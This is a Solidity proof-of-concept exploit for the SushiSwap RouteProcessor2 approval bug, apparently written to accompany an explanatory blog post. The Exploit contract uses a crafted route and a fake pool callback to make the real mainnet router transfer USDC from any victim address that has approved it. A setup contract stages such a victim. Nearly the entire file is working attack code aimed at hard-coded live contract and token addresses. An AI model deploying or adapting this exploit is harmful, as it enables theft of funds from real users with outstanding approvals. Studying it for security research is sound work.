// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

// Interface for getting USDC tokens from Uniswap for ETH
interface UniswapV2RouterLike {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}

// https://etherscan.io/address/0x044b75f554b886a065b9567891e45c79542d7357#code
// The sushiSwap function that we want to call. 
interface sushiSwapLike{
  function processRoute(
    address tokenIn,
    uint256 amountIn,
    address tokenOut,
    uint256 amountOutMin,
    address to,
    bytes memory route
  ) external payable returns (uint256 amountOut); 


  // Callback function from the pool that we want to hit
  function uniswapV3SwapCallback (
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data) external;
}


/*
SushiSwap exploit code.
For more details, read https://maxwelldulin.com/BlogPost/sushiswap-exploit-explained-2023.
*/
contract Exploit{

  // Contract we want to exploit
  sushiSwapLike sushiRouter = sushiSwapLike(0x044b75f554b886A065b9567891e45c79542d7357); 
  address victim = address(0x5DD596C901987A2b28C38A9C1DfBf86fFFc15d77); 
  address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; 
  bool public called = false;

  function attack() external{

    // Main parameters for the 'processRoute' function
    address tokenIn = usdc;       // Must be a valid ERC20 token
    uint256 amountIn = 1;         // Greater than 0 for sanity checks
    address tokenOut = usdc;      // Must be a valid ERC20 token
    uint256 amountOutMin = 1;     // Don't care about value
    address to = address(this);   // Don't care aout value

    /*
    Route construction
    -----------------------------
    Command code:
    - Type of swap to perform
    - 4 - use 'processOnePool' function 
    - uint8 (1 byte) 
    TokenIn: 
    - Address of the token to trade
    - Content doesn't matter
    - address (20 bytes) 
    Pool Code:
    - uniswapV3 pool
    - 1 - call uniswapV3 function 
    - uint8 (1 byte) 
    Uniswap Pool
    - The address of the uniswap pool. For our exploit, this is a malicious contract to exploit the callback.
    - address(this) 
    - address (20 bytes) 
    Zero For One
    - Ticks for uniswapv3. Not entirely sure what this parameter is for.
    - 0 or 1 - doesn't matter
    - boolean (1 byte)
    recipient
    - The address that should receive the funds from the trade
    - Does not matter
    - address (20 bytes) 
    */
    bytes memory route = abi.encodePacked(uint8(4), address(this), uint8(1), address(this), true, address(this));

    // Attacking payload
    sushiRouter.processRoute(
      tokenIn,
      amountIn, 
      tokenOut, 
      amountOutMin, 
      to, 
      route);
  }


  /*
  Function that we **trick** the router to call for us.
  Called at 
  */
  function swap(
    address recipient,
    bool zeroForOne,
    int256 amountSpecified,
    uint160 sqrtPriceLimitX96,
    bytes calldata data
  ) external returns (int256 amount0, int256 amount1){


    // Get all of the funds for our victim user -- should also 
    // check the 'approval' of the router though.
    int256 value0 = int256(IERC20(usdc).balanceOf(address(victim))); 
    int256 value1 = -1; 

    // usdc is the token we want to steal
    // victim is the 'address' we want to steal the funds from
    bytes memory route = abi.encode(usdc, victim);

    // Send the data... claim other persons USDC through a bad approval
    sushiRouter.uniswapV3SwapCallback(value0, value1, route); 
  }

  // Set the victim program
  function setVictim(address newVictim) public{
    victim = newVictim;
  }

  // Get balances of our current user and victim for USDC
  function getBalances() external view returns (uint256, uint256){
    IERC20 usdcContract = IERC20(usdc);
    uint256 val1 = usdcContract.balanceOf(address(this));
    uint256 val2 = usdcContract.balanceOf(address(victim)); 

    return (val1, val2);
  }
}

// Victim user with funds and an approval on the router
contract SetupExploit{

  // Vulnerable contract
  sushiSwapLike sushiRouter = sushiSwapLike(0x044b75f554b886A065b9567891e45c79542d7357); 

  // Uniswap trading pool -- used to trade ETH for USDC
  UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
  address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Token of choice for the attack

  function getFunds(address exploitContract) external payable{
      address[] memory path1 = new address[](2);
      path1[0] = address(weth);
      path1[1] = usdc; // Getting USDC to trade later

      // Getting 20 eth worth of USDC. Send it back to THIS contract.
      uint256[] memory amounts1 = router.swapExactETHForTokens{value: 20 ether}(0, path1, address(this), block.timestamp);

      // Approve the the router to spend all of the contracts funds.
      IERC20(usdc).approve(address(sushiRouter), type(uint256).max);

      // Set this contract to be the victim of the attack
      Exploit(exploitContract).setVictim(address(this));
  }
}